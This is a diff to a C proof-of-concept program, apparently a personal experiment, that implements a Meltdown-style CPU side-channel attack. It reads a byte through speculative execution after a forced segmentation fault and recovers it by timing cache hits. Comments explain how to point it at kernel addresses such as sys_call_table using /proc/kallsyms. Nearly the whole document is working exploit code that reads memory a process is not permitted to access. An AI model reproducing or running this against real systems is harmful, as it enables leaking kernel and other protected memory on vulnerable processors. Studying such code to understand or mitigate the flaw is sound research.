@@ -5,9 +5,10 @@
 #include <signal.h>
 #include <setjmp.h>
 
-#define PAGE_SIZE_SHIFT     (0xC)
-#define PAGE_SIZE_SHIFT_STR "0xC"
-#define PAGE_SIZE           (1 << PAGE_SIZE_SHIFT)
+#define PAGE_SIZE_SHIFT      (0xC)
+#define PAGE_SIZE_SHIFT_STR  "0xC"
+#define PAGE_SIZE            (1 << PAGE_SIZE_SHIFT)
+#define MAX_CACHE_READ_TICKS (200)
 
 __attribute__((always_inline))
 inline unsigned long get_access_ticks(const char *addr)
@@ -33,17 +34,17 @@ inline unsigned long get_access_ticks(const char *addr)
 }
 
 __attribute__((always_inline))
-inline void speculative_byte_load_and_cache_meltdown(uintptr_t ptr, char* buf)
+inline void heat_cache(uintptr_t addr, char* buf)
 {
     asm __volatile__ (
         "%=:                                  \n"
         "xorq %%rax, %%rax                    \n"
-        "movb (%[ptr]), %%al                  \n"
+        "movb (%[addr]), %%al                  \n"
         "shlq $" PAGE_SIZE_SHIFT_STR ", %%rax \n"
         "jz %=b                               \n"
         "movq (%[buf], %%rax, 1), %%rbx       \n"
         : 
-        :  [ptr] "r" (ptr), [buf] "r" (buf)
+        :  [addr] "r" (addr), [buf] "r" (buf)
         : "%rax", "%rbx");
 }
 
@@ -67,17 +68,16 @@ static void sigsegv_handler(int signo)
 
 void main()
 {
-    uintptr_t address_to_guess_byte;
+    uintptr_t address_to_guess_byte = 0;
+        // = 0xffffffff986001e0; // uncomment to test with global addresses.
+        // I do tests on sys_call_table. Your current sys_call_table address can be found: sudo cat /proc/kallsyms | grep sys_call_table
+        // sys_read address should be first value in sys_call_table.
+        // You can find your sys_read address: sudo cat /proc/kallsyms | grep sys_read
 
-    if (1) { // testing with local address
+    if (address_to_guess_byte == 0) { // testing with local address
         char *local_byte = malloc(1);
         *local_byte = 0xAA;
         address_to_guess_byte = (uintptr_t) local_byte;
-    } else { // testing with global address
-        address_to_guess_byte = 0xffffffff986001e0;
-        // do tests on sys_call_table. your current sys_call_table address can be found: sudo cat /proc/kallsyms | grep sys_call_table
-        // sys_read address should be first value in sys_call_table.
-        // you can find your sys_read address: sudo cat /proc/kallsyms | grep sys_read
     }
 
     char *meltdown_buf = mmap(NULL, PAGE_SIZE * 256, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0);
@@ -92,23 +92,23 @@ void main()
         if(sigsetjmp(jbuf, !0) == 0) {
             *((char*)NULL) = 1; // force SIGSEGV (even when testing with local addrress)
 
-            // the code below should not be executed because of SEISEGV
-            // but don't worry. it most likely will be executed because of out-of-order execution optimizations in Intel CPUs :-)
+            // The code below should not be executed because of SEISEGV.
+            // But don't worry. It most likely will be executed because of out-of-order execution optimizations in Intel CPUs :-)
 
-            speculative_byte_load_and_cache_meltdown(address_to_guess_byte, meltdown_buf);
+            heat_cache(address_to_guess_byte, meltdown_buf);
 
             printf("you should never see this line because of SIGSEGV above\n");
         } else { // else branch is executed on SIGSEGV
             static unsigned long ticks[256];
 
-            // measure access ticks of each page in buffer
+            // measure access ticks of each page in the buffer
             for (int i = 0; i < 256; i++) {
                 ticks[i] = get_access_ticks(&meltdown_buf[PAGE_SIZE * i]);
             }
 
             for (int i = 0; i < 256; i++) {
-                if (ticks[i] < 200) { // reading from cache is usually less than 200 ticks on my CPU
-                    // if the page is in cache then corresponding page shift is most likely byte value
+                if (ticks[i] < MAX_CACHE_READ_TICKS) { // reading cached page takes less CPU ticks then reading not cached one
+                    // if the page is in the cache then corresponding page shift is most likely the byte value we are guessing
                     printf("guessed byte: 0x%X\n", i);
                 }
             }
